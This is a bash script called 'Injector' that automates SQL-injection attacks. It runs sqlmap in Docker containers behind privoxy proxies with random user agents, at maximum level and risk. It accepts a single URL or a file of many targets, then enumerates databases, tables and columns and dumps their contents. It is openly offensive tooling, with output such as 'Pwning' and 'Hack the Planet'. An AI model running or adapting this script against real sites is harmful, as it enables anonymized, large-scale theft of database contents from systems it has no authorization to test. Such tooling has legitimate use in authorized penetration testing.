#!/bin/bash
#Injector a.k.a tr4c1l0rds
#Author: alexos
#Special Contribuitors: userx nekone alacerda

#  ____________________________________________________________________________
#  /______|________________________________________/__|________________________
#  $$$$$$/_________________________________________$$_|________________________
#  __$$_|__/_______\_____/__|_/______\__/_______|/_$$___|___/______\__/______\_
#  __$$_|__$$$$$$$__|____$$/_/$$$$$$__|/$$$$$$$/_$$$$$$/___/$$$$$$__|/$$$$$$__|
#  __$$_|__$$_|__$$_|____/__|$$____$$_|$$_|________$$_|____$$_|__$$_|$$_|__$$/_
#  __$$_|__$$_|__$$_|____$$_|$$$$$$$$/_$$_\________$$_|/__|$$_\__$$_|$$_|______
#  /_$$___|$$_|__$$_|____$$_|$$_______|$$_______|__$$__$$/_$$____$$/_$$_|______
#  $$$$$$/_$$/___$$/_____$$_|_$$$$$$$/__$$$$$$$/____$$$$/___$$$$$$/__$$/_______
#  ________________/__\__$$_|__________________________________________________
#  ________________$$____$$/___________________________________________________
#  _________________$$$$$$/____________________________________________________


build_environment() {
    #-----------------------------
    #       Terminal colors      #
    #-----------------------------

    BLUE="\e[00;34m"
    GREEN="\e[00;32m"
    BOLD_YELLOW="\e[01;33m"
    CYAN="\e[0;31m"
    END="\e[00m"

    #-----------------------------
    #           Variables        #
    #-----------------------------
    VOLUME="$HOME/.sqlmap/:/root/.sqlmap"
    INST="$HOME/.instances"
    THREAD=$(lscpu | grep CPU\(s\) | sed "s/ //g" |grep -v "-" |awk -F ":" '{print $2}')
    CID=""
    DATA=$2
    USERAGENT="--random-agent"
    LEVEL="5"
    RISK="3"
    FILE=""
    DATABASE=""
    TABLE=""
    CONTNAME=""
    POST=""
    TCONT=$(docker ps -q | wc -l)
    TEXIT=$(docker ps -q -f "status=exited" | wc -l)

}


stop_containers() {
	if [ $STOPCONT == "all" ]; then
		for cont in $(docker ps -aq); do
            docker stop $cont | xargs docker rm 2>/dev/null
	        rm  $INST 2>/dev/null
		done
	else
		docker stop $STOPCONT | xargs docker rm 2>/dev/null
		echo -e "$GREEN $STOPCONT removed"
	fi
	exit 0
}

list_containers() {
	docker ps -a
	echo -e "$GREEN $TCONT instances running$END"
	exit 0
}

list_exited() {
	docker ps -a -f status=exited
	echo -e "$GREEN $TEXIT instances exited$END"
	exit 0
}

log_containers() {
	if [ $LOGCONT = " " ]; then
		echo -e "$BOLD_YELLOW[-] Provide the injector container's name [!!]$END"
        exit 0
    else
        docker logs --details -f $LOGCONT
    fi
    exit
}

stats_containers() {
    docker stats --format "table {{.Name}} \t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}\t {{.BlockIO }} "
}

priv_kill () {
	docker stop proxy$CID 1>/dev/null
}

attack() {
    check_service
    if [  -z $CONTNAME ]; then
        if [ ! -f $INST ]; then
            echo -n 1 > $INST
    	else
            expr $(cat $INST) + 1 > $INST
        fi
        CID=$(cat $INST)
	    CONTNAME="injector$CID"
    fi

    echo -e "$GREEN==> Pwning $BOLD_YELLOW$TARGET$END"
    # Privoxy container
    docker run -d --rm --name proxy$CID alexoscorelabs/privoxy >> /dev/null
    sleep 10
    privoxy_ip=$(docker inspect --format '{{ .NetworkSettings.IPAddress }}' proxy$CID)

    if [ -z $DATABASE ]; then
        params="--dbs"
    else
        if [ -z $TABLE ]; then
            params="--tables -D $DATABASE"
        else
            if [ -z $DUMP ]; then
       	        params="-T $TABLE -D $DATABASE --columns"
            else
                params="-T $TABLE -D $DATABASE --dump"
            fi
    	fi
    fi

    if [ ! -z $POST ]; then
	    if [ -e $POST ]; then
        	params="--method POST -r $POST"
	    else
        	params=$params" --method POST --data $POST"
	    fi
    fi

    # Sqlmap container
    docker run -d -it -v $VOLUME --name $CONTNAME alexoscorelabs/sqlmap -u $TARGET --proxy "http://$privoxy_ip:8118" $USERAGENT $params --batch --level "5" --risk "3" >> /dev/null
    # sudo chown -R $USER:$USER /tmp/sqlmap

    # At this point docker watches the container. When it terminates, docker triggers priv_kill function in order to
    # remove privoxy container that was pairing with this sqlmap instance
    docker wait $CONTNAME 1>/dev/null && priv_kill &
    CONTNAME=""
}

read_file () {
	for NEW_TARGET in $(cat $FILE); do
        TARGET=$NEW_TARGET
        attack
	done
    exit 0
}


update() {

        if [ $TCONT != "0" ]; then
                echo "$BOLD You have $TCONT instances running now... Please wait that attacks finish or stop the instances!"
                exit 0
         else
                read -p "$BOLD Can update the injector now?[y/n]" input

                if [ $input == "y" ] || [ $input == "Y" ]; then

                       echo -e "$GREEN[+] Removing existent images...$END"
		       docker rmi alexoscorelabs/sqlmap > /dev/null
		       docker rmi alexoscorelabs/privoxy > /dev/null
                       echo -e "$GREEN[+] Done...$END"

                       echo -e "$GREEN[+] Updating privoxy image..$END"
                       cd privoxy
                       sudo docker build -t alexoscorelabs/privoxy . > /dev/null
                       sudo docker run -d --name proxy alexoscorelabs/privoxy > /dev/null
                       echo -e "$GREEN[+] Done...$END"

                       echo -e "$GREEN[+] Testing network...$END"
                       curl -x 172.17.0.2:8118 http://ifconfig.es
                       sudo docker rm -f proxy

                       echo -e "$GREEN[+] Updating sqlmap image...$END"
                       cd ../sqlmap
                       sudo docker build -t alexoscorelabs/sqlmap . > /dev/null
                       echo -e "$GREEN[+] Done...$END"
                       exit 0
                else
                       echo -e "Ok! Exiting"
                       exit 0
                fi
        fi
 }


# Main starts here

check_service () {
    echo -e "$GREEN[~] Checking if docker service is up...$END"
    sudo systemctl status docker.service > /dev/null

    if [ $? == "3" ]; then
        echo -e "$BOLD_YELLOW[+] Starting docker...$END"
        sudo systemctl start docker.service
    else
        echo -e "$GREEN[+]Service is running...Hack the Planet...$END"
    fi
}

usage() {
	echo -e "Usage: $0 [-u <url>] [<OPTIONS>]\n" \
            "Usage: $0 [OPTIONS]\n" \
            "OPTIONS:\n" \
            "\t-l | $GREEN--list$END$GREEN\tList all existent containers$END\n" \
            "\t-e | $GREEN--exited$END$GREEN\tList exited containers$END\n" \
            "\t-u | $GREEN--url$END$GREEN\tSet target url to be tested (e.g. injector -u www.example.com)$END\n" \
            "\t-f | $GREEN--file$END$GREEN\tSet a file containing a list of targets (e.g. injector -f targets.txt)$END\n" \
            "\t-d | $GREEN--database$END$GREEN\tSet the target database (e.g. injector -d <database> $END\n" \
            "\t-t | $GREEN--table$END$GREEN\tSet the target table (e.g. injector -d <database> -t <table>)$END\n" \
            "\t-r | $GREEN--post$END$GREEN\tSet the POST request parameters (e.g -r param1&param2 or -r POST file request)$END\n" \
            "\t-s | $GREEN--stop$END$GREEN\tStop the specified container (e.g. injector -s <container_name>) or use -s all to stop all containers$END\n" \
            "\t-o | $GREEN--logs$END$GREEN\tShow the container log$END\n" \
            "\t-p | $GREEN--dump$END$GREEN\tDump the data$END\n" \
            "\t-a | $GREEN--stats$END$GREEN\tDisplay the container's statistics$END\n" \
            "\t-i | $GREEN--update$END$GREEN\tUpdate Injector$END\n" \
            "\t-h | $GREEN--help$END$GREEN\tPrint this help$END\n"

	exit 0
}


# Here is where the program actually starts
handle_args() {

    ARGS=`getopt -o leui::s:o:f:d:t:r:pha --long list,exited,url,update:,stop:,logs:,file:,database:,table:,post:,dump,stats,help -n 'injector' -- "$@"`

    if [ $? != 0 ]; then
        exit 1
    fi

    while true; do
        case "$1" in
            -u | --url )
                TARGET=$2
                shift
                shift
                if [ -z $1 ]; then
                    break
                fi
                ;;

            -d | --database )
                DATABASE=$2
                shift
                shift
                if [ -z $1 ]; then
                    break
                fi
                ;;

            -t | --table )
                TABLE=$2
                shift
                shift
                if [ -z $1 ]; then
                    break
                fi
                ;;

            -n | --name )
                CONTNAME=$2
                shift
                shift
                if [ -z $1 ]; then
                    break
                fi
                ;;

            -r | --post )
                POST=$2
                shift
                shift
                if [ -z $1 ]; then
                    break/
                fi
                ;;

            -p | --dump )
                DUMP="True"
                shift
                if [ -z $1 ]; then
                    break
                fi
                ;;

            -s | --stop )
                echo -e "Stopping :$BOLD_YELLOW $2 $END"
                STOPCONT=$2
                stop_containers
                break
                ;;

            -l | --list )
                list_containers
                shift
                break
                ;;

            -i | --update )
                update
                shift
                break
                ;;

       	    -e | --exited )
                list_exited
                break
                ;;

            -o | --logs )
                LOGCONT=$2
                log_containers
                break
                ;;

            -a | --stats )
                stats_containers
                break
                ;;

            -f | --file )
                FILE=$2
                read_file
                shift
                shift
                ;;

            -h | --help )
                usage
                ;;

            * )
                usage
                ;;

        esac
    done
}

# clear
build_environment
handle_args "$@"
# check_service
attack
